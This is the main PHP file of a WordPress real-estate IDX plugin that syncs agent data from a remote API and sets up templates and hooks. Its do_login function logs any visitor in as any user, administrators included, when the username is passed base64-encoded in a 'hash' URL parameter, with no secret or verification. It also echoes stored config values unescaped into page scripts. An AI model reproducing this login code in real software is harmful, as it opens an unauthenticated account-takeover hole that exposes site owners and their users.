<?php
/*
	Plugin Name: Agent IDX Plugin
	Description: This plugin synchronize RETS data with local database and provide property search functionality.
	Version: 1.4.47
	Author: Thats End PVT. LTD.
	Author URI: https://thatsend.com/
*/

#	NO direct linking / direct output from Plugin's source
if(!defined('ABSPATH') || !defined('WPINC'))
    exit();

require 'updater.php';

/**
 * define shorthand directory separator constant
 */
if (!defined('DS')) {
    define('DS', DIRECTORY_SEPARATOR);
}

error_reporting(E_ALL & ~E_DEPRECATED & ~E_STRICT & ~E_NOTICE & ~E_WARNING);

global $arrPhysicalPath, $arrVirtualPath, $arrConfig, $objTmpl, $objVWDb, $objAjaxResp, $recContent, $objAPI, $agentInfo;

$arrPhysicalPath 	= array();
$arrVirtualPath 	= array();
$arrConfig 		    = array();
$objTmpl 			= '';
$objVWDb			= '';
$objAjaxResp		= '';
$recContent         = '';


define('XHR',                   'XHR');
define('XHR_URL',               'URL');
define('XHR_AJAX',              'AJAX');
define('XHR_AREA',              'AREA');
define('XHR_MODULE',            'MODULE');
define('XHR_ACTION',            'ACTION');
define('XHR_R_ASSIGN',          'ASSIGN');
define('XHR_R_APPEND',          'APPEND');
define('XHR_R_PREPEND',         'PREPEND');
define('XHR_R_SCRIPT',          'SCRIPT');
define('XHR_R_REDIRECT',        'REDIRECT');
define('XHR_R_ERROR',           'ERROR');
define('XHR_R_SUCCESS',         'SUCCESS');
define('XHR_R_DATA',            'DATA');

/**
 * set DIR to absolute physical path to plugin files.
 */
if (!defined('BASE_DIR')) {
    define('BASE_DIR', dirname(__FILE__) . DS);
}

/**
 * set URL to absolute url path to plugin files.
 */
if (!defined('BASE_URL')) {
    define('BASE_URL', plugins_url('', __FILE__). '/');
}

/**
 * Define basic folders paths
 */
$arrPhysicalPath['Base']			= dirname(__FILE__) . DS;
$arrVirtualPath['Base']			    = plugins_url('', __FILE__). '/';

$arrPhysicalPath['Install'] 		= $arrPhysicalPath['Base']. 'install' . DS;
$arrPhysicalPath['Widget'] 		    = $arrPhysicalPath['Base']. 'widget' . DS;
$arrPhysicalPath['DBAccess'] 	    = $arrPhysicalPath['Base']. 'db_access' . DS;

$arrPhysicalPath['Libs'] 		    = $arrPhysicalPath['Base']. 'libs' . DS;
$arrVirtualPath['Libs'] 			= $arrVirtualPath['Base']. 'libs' . '/';

$arrPhysicalPath['UploadBase'] 	    = $arrPhysicalPath['Base']. 'upload' . DS;
$arrVirtualPath['UploadBase'] 	    = $arrVirtualPath['Base']. 'upload' . '/';

$arrVirtualPath['AssetsUrl'] 	    = $arrVirtualPath['Base']. 'assets/image.php';

/**
 * Load basic files
 */
include_once $arrPhysicalPath['Base']. 'Constants.php';
include_once $arrPhysicalPath['Base']. 'StaticArray.php';
include_once $arrPhysicalPath['Base']. 'Utility.php';

spl_autoload_register('db_access');
function db_access($class)
{
    global $arrPhysicalPath;
    $path = $arrPhysicalPath['DBAccess']. '/'.$class.'.php';

    if(file_exists($path)){require_once($path);}
}

$objAPI = IDXAPI::getInstance();

# We are going to use our mysql class
if(strpos($_SERVER['HTTP_HOST'], 'project') !== false)
{
    include_once $arrPhysicalPath['Libs']. 'mysqli5.php';
}
else
{
    include_once $arrPhysicalPath['Libs']. 'mysqli5.php';
}
include_once $arrPhysicalPath['Libs']. 'pdo-2.1.php';
global $wpdb;

$objDB = new DB_Sql($wpdb->dbh);

# Read Config
$arrConfig = get_option(Constants::OPTIONS);

$arrConfig['idx_api_flag']   = true;

if(strpos($_SERVER['HTTP_HOST'], '.project') !== false)
{
    $arrConfig['idxapi_url'] = 'http://agentidx-api.project:'.$_SERVER['SERVER_PORT'].'/apis/DataFetcher.php';
    $arrConfig['autosugg_url'] = 'http://agentidx-api.project:'.$_SERVER['SERVER_PORT'].'/autosuggest.php';
    $arrConfig['upload_url'] = 'http://agentidx-api.project:'.$_SERVER['SERVER_PORT'].'/upload/';
}
elseif(strpos($_SERVER['HTTP_HOST'], 'thatsend') !== false)
{
    $arrConfig['idxapi_url'] = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].'/backend/API/apis/DataFetcher.php';
    $arrConfig['autosugg_url'] = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].'/backend/API/autosuggest.php';
    $arrConfig['upload_url'] = $_SERVER['REQUEST_SCHEME'].'://'.$_SERVER['HTTP_HOST'].'/backend/API/upload/';

}else{
    $arrConfig['idxapi_url'] = 'https://CustomWpPluginDemoDomain.com/API/apis/DataFetcher.php';
    $arrConfig['autosugg_url'] = 'https://CustomWpPluginDemoDomain.com/API/autosuggest.php';
    $arrConfig['upload_url'] = 'https://CustomWpPluginDemoDomain.com/API/upload/';

}
$arrConfig['pic_path']  =   $arrConfig['api_host_url'].'/pictures/property';


$site_url = str_replace('www.','',$_SERVER['HTTP_HOST']);
$agentInfo = IDXAPI::getInstance()->getWebsiteAgentInfo($site_url);
$current_time = time();

//echo '<pre>';print_r($agentInfo);exit();

if(!isset($arrConfig['Site_Agent']) || (isset($arrConfig['Site_Agent']) &&( empty($arrConfig['Site_Agent']['agent_id'])||($current_time - $arrConfig['Site_Agent']['current_time'] >= 7200))))
{
    $agentInfo = IDXAPI::getInstance()->getWebsiteAgentInfo($site_url);

    if(is_array($agentInfo) && count($agentInfo) > 0)
    {
        $arrConfig['Site_Agent']['agent_id']        = $agentInfo['agent_id'];
        $arrConfig['Site_Agent']['agent_email']     = $agentInfo['agent_email'];
        $arrConfig['Site_Agent']['agent_key_code']  = $agentInfo['agent_key_code'];
        $arrConfig['Site_Agent']['agent_active']    = $agentInfo['agent_active'];
        $arrConfig['Site_Agent']['agent_website']   = $agentInfo['agent_website'];
        $arrConfig['Site_Agent']['current_time']    = time();
        $arrConfig['Site_Agent']['agent_mls']       = $agentInfo['agent_mls'];
        $arrConfig['Site_Agent']['crypto_active']   = $agentInfo['crypto_active'];
        $arrConfig['Site_Agent']['agent_select_mls']   = $agentInfo['agent_select_mls'];
        $arrConfig['Site_Agent']['market_report_active']   = $agentInfo['market_report_active'];
        $arrConfig['Site_Agent']['agent_signin_text']   = $agentInfo['agent_signin_text'];
    }

    update_option(Constants::OPTIONS, $arrConfig);
}
else
{
    $agentInfo = IDXAPI::getInstance()->getWebsiteAgentInfo($site_url);
    $arrConfig['Site_Agent']['crypto_active']   = $agentInfo['crypto_active'];
    $arrConfig['Site_Agent']['agent_select_mls']   = $agentInfo['agent_select_mls'];
    $arrConfig['Site_Agent']['market_report_active']   = $agentInfo['market_report_active'];
    $arrConfig['Site_Agent']['agent_signin_text']   = $agentInfo['agent_signin_text'];
    $agentInfo = $arrConfig['Site_Agent'];
}
if(!defined("IN_CRON") && !defined("IN_ASSETS"))
{
    /**
     * Load install files
     */
    include_once $arrPhysicalPath['Install']. 'Installer.php';

    # Runs when plugin is activated
    register_activation_hook(__FILE__,array(Installer::getInstance(), 'install'));
    add_action( 'upgrader_process_complete', function( $upgrader_object, $options ) {

        global $arrPhysicalPath;

        include_once $arrPhysicalPath['Install']. 'Installer.php';
		Installer::getInstance()->update();

	}, 10, 2 );



    include_once $arrPhysicalPath['Base']. 'RewriteRules.php';
    include_once $arrPhysicalPath['Base']. 'class/ModuleUrl.php';
    add_action('init', array(RewriteRules::getInstance(), "initialize"), 1 );

    # Define some base path and call initialize depending on user
    if( is_admin() && (!isset($_REQUEST['ajax_in_site']))){
        # Define required paths
        $arrPhysicalPath['UserBase'] 	= $arrPhysicalPath['Base']. 'admin' . DS;
        $arrVirtualPath['UserBase'] 	= $arrVirtualPath['Base']. 'admin' . '/';

    } else {
        # Define required paths
        $arrPhysicalPath['UserBase'] 	= $arrPhysicalPath['Base']. 'front' . DS;
        $arrVirtualPath['UserBase'] 	= $arrVirtualPath['Base']. 'front' . '/';
    }

    # Define template paths
    $arrPhysicalPath['TemplateBase']		= $arrPhysicalPath['UserBase']. 'templates' . DS;
    $arrVirtualPath['TemplateBase'] 		= $arrVirtualPath['UserBase']. 'templates' . '/';

    $arrVirtualPath['TemplateImages'] 	= $arrVirtualPath['TemplateBase']. 'images' . '/';
    $arrVirtualPath['TemplateCss'] 		= $arrVirtualPath['TemplateBase']. 'css' . '/';
    $arrVirtualPath['TemplateJs'] 		= $arrVirtualPath['TemplateBase']. 'js' . '/';

    $arrPhysicalPath['EmailTemplate']		=	$arrPhysicalPath['Base']. '/email_templates'. DS;

    # Get the smarty and create global object
    include_once $arrPhysicalPath['Libs']. 'Smarty4/Smarty.class.php';

    $objTmpl = new Smarty();

    $objTmpl->template_dir 	= array($arrPhysicalPath['TemplateBase'], $arrPhysicalPath['EmailTemplate']);
    $objTmpl->compile_dir 	= $arrPhysicalPath['UserBase']. 'templates_c';

    $objTmpl->assignByRef('objUtility', Utility::getInstance());
    add_action('init','do_login');
    function do_login()
    {
        if(isset($_GET['hash']) && $_GET['hash'] != '')
        {
            $allowed_html   =   array();
            $de_hash = base64_decode($_GET['hash']);

            $user_detail = $de_hash;
            $user = get_user_by('login',$user_detail);
            if( $user ) {
                wp_set_current_user( $user->ID, $user->data->user_login );
                wp_set_auth_cookie( $user->ID );
                do_action( 'wp_login', $user->data->user_login );
                header('Location:'.get_home_url().'/myaccount');
                exit(0);
            }
        }
    }

    if( is_admin() && (!isset($_REQUEST['ajax_in_site']))) {

        # initialize admin area
        include_once $arrPhysicalPath['UserBase']. 'AdminModule.php';
        include_once $arrPhysicalPath['UserBase']. 'Admin.php';
        //include_once $arrPhysicalPath['UserBase']. 'TinyMceManager.php';
        include_once($arrPhysicalPath['UserBase']. 'AdminAjaxRequest.php');

        Admin::getInstance()->initialize();

    }
    else{

        # initialize front area
        include_once $arrPhysicalPath['UserBase']. 'Front.php';
        include_once $arrPhysicalPath['UserBase']. 'FrontModule.php';
        include_once $arrPhysicalPath['UserBase']. 'FrontModuleDispatcher.php';
        include_once($arrPhysicalPath['UserBase']. 'FrontAjaxRequest.php');

        require_once($arrPhysicalPath['Libs']. '/OE_ClientWindow/cw.php');
        cw::$obj = new cw(array('cookie_name'=>'crs_cw'));
        # At initial load screen is not detected so set screen size as per assumption afer once screen will be detected it will be more perfect
        if(cw::$screen == null)
        {
            require_once($arrPhysicalPath['Libs']. '/Mobile-Detect-2.8.19/OE_Mobile_Detect.php');
            dd::$obj = new dd();

            if(dd::$obj->isMobile() && !dd::$obj->isTablet())
                cw::$screen = CW_S_XS;
            elseif(dd::$obj->isTablet())
                cw::$screen = CW_S_MD;
            else
                cw::$screen = CW_S_XL;

            cw::$obj->SetApproxScreenDimention(cw::$screen);
        }

        if(is_array($agentInfo) && count($agentInfo) > 0 && $agentInfo['agent_active'] == true)
        {
            Front::getInstance()->initialize();
        }
	    add_action('http_api_curl', 'sar_custom_curl_timeout', 9999, 1);
        function sar_custom_curl_timeout( $handle ){
		            curl_setopt( $handle, CURLOPT_CONNECTTIMEOUT, 40 ); // 40 seconds. Too much for production, only for testing.
		            curl_setopt( $handle, CURLOPT_TIMEOUT, 40 ); // 40 seconds. Too much for production, only for testing.
		        }
        add_filter( 'page_template', array(FrontModuleDispatcher::getInstance(), "getPageTemplate"),'' );
        add_filter( 'the_content', array(FrontModuleDispatcher::getInstance(), "getContent"), 20 );
        add_filter( 'the_posts', array(FrontModuleDispatcher::getInstance(), "postCleanUp") );

        add_filter( 'wp_mail_from', 'my_mail_from' );
        function my_mail_from( $email ) {
            global $arrConfig;

            return $arrConfig['Agent']['agent_email'];
            //return "agentidx@gmail.com";
        }
        add_filter( 'wp_mail_from_name', 'my_mail_from_name' );
        function my_mail_from_name( $name ) {
            global $arrConfig;

            return $arrConfig['Agent']['agent_name'];
        }

        add_action('init','remove_divi_actions');
        function remove_divi_actions() {
            remove_action(  'wp_head', 'et_add_viewport_meta' );
        }
        function et_add_viewport_meta_2(){
            echo '<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, maximum-scale=1.0">';
        }
        add_action( 'wp_head', 'et_add_viewport_meta_2' );

	    function add_analytics_code()
	    {
		    global $arrConfig;

		    echo stripslashes($arrConfig['OtherConfig']['google_conv_code']);
	    }
	    add_action( 'wp_head', 'add_analytics_code' );
	    function add_gmt_code()
	    {
		    global $arrConfig;
		    echo "<script type=\"text/javascript\"> var gmt_code = '"; echo trim(stripslashes($arrConfig["OtherConfig"]["google_manage_code"]));echo "';</script>";
		    echo "<script type=\"text/javascript\"> jQuery( \"body\" ).prepend( gmt_code );</script>";

	    }
	    add_action('wp_footer','add_gmt_code');
    }

    // define the wpcf7_before_send_mail callback
    function action_wpcf7_before_send_mail( $contact_form ) {

        $id = $contact_form->id();
        if ($id){
            $submission = WPCF7_Submission::get_instance();
            $posted_data = $submission->get_posted_data();
            LPTLeadMaster::getInstance()->InsertContactFromLeads($posted_data);
        }
    };

    // add the action
    add_action( 'wpcf7_before_send_mail', 'action_wpcf7_before_send_mail', 10, 1 );
}